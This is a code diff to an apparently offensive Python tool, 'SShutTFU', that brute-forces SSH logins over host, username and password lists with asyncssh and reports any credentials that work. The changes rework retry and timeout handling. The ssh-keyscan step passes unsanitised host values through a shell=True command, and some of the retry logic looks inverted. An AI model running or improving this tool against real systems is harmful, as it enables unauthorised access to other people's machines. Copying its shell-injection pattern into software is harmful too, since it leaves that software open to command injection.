@@ -1,4 +1,3 @@
-import subprocess
 import itertools
 import asyncssh
 import asyncio
@@ -6,6 +5,7 @@ import logging
 
 from sys import argv
 from pathlib import Path
+from subprocess import Popen, PIPE, STDOUT
 
 log = logging.basicConfig(format='ssh_auth 🠖 %(message)s', level=logging.WARNING)
 
@@ -19,6 +19,9 @@ class SShutTFU:
         self.known_hosts = known_hosts
         self.ignore_hosts = []
         self.async_timeout = 5
+
+        self.timeout_hosts = []
+        self.timeout_retries = 3
 
     @staticmethod
     def _return_list(item):
@@ -40,30 +43,34 @@ class SShutTFU:
             port = 22
             if ':' in host:
                 host,  port = host.split(':')
-            command = "ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p"
-            proc = subprocess.check_call(f"{command} {port} {str(host)} >> {self.known_hosts} 2>/dev/null", shell=True)
-            if proc == 0:
-                print(f" 🠖 Key Added for Host: {host}")
-            elif proc == 1:
-                print(f"[ERROR] Key for Host: {host} failed to add.  Sending to ignore list.")
+            command = f"ssh-keyscan -t rsa,dsa,ecdsa,ed25519 -p {port} {host} >> {self.known_hosts}"
+            proc = Popen(command, stdin=PIPE, stdout=PIPE, stderr=STDOUT, shell=True)
+            output = proc.stdout.read()
+            if not output:
+                print(f"Failed to retrieve keys from {host}. Host did not respond and sending to ignore list.")
                 if host not in self.ignore_hosts:
                     self.ignore_hosts.append(host)
+            else:
+                print(f" 🠖 Key Added for Host: {host}")
             host_queue.task_done()
 
     async def worker(self, queue):
         """Asynchronous Process - Queue Worker"""
         while queue.empty() is not True:
             h, u, p = await queue.get()
-            timeout_retry = 0
+
+            timeout = self.async_timeout
+            timeout_retry = self.timeout_retries
             k = self.known_hosts
-            if h in self.ignore_hosts:
-                continue
+
             while True:
+                if h in self.ignore_hosts:
+                    break
                 try:
                     t = 22
                     if ':' in h:
                         h, t = h.split(':')
-                    if timeout_retry == 0:
+                    if timeout_retry != 0:
                         print(f"Attempting {u} {p} on host {h}                                              \r", end='')
                     else:
                         print(f"Retry {timeout_retry} Attempting {u} {p} on host {h}                        \r", end='')
@@ -72,7 +79,7 @@ class SShutTFU:
                         username=u,
                         port=t,
                         password=p,
-                        known_hosts=k), timeout=self.async_timeout)
+                        known_hosts=k), timeout=timeout)
                     print(f" 🠖 Credentials Found: {h} - User:{u} Pass:{p}                                            ")
                 except asyncssh.PermissionDenied:
                     pass
@@ -80,13 +87,15 @@ class SShutTFU:
                     k = None
                     continue
                 except (TimeoutError, asyncio.TimeoutError):
-                    timeout_retry += 1
-                    if timeout_retry >= 3:
-                        break
+                    timeout_retry -= 1
                     continue
                 except asyncssh.misc.ProtocolError:
                     break
                 finally:
+                    if timeout_retry == 0:
+                        if h not in self.ignore_hosts:
+                            self.ignore_hosts.append(h)
+                            self.timeout_hosts.append(h)
                     queue.task_done()
                 break
         return
